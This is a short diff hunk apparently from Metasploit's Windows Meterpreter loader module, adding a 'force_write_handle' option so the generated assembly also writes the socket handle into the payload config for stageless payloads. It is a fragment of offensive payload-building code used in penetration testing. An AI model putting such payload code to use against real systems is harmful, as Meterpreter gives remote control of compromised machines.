@@ -53,7 +53,7 @@ module Payload::Windows::MeterpreterLoader
           add ebx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
     ^
 
-    unless opts[:stageless]
+    unless opts[:stageless] || opts[:force_write_handle] == true
       asm << %Q^
           mov [ebx], edi        ; write the current socket/handle to the config
       ^
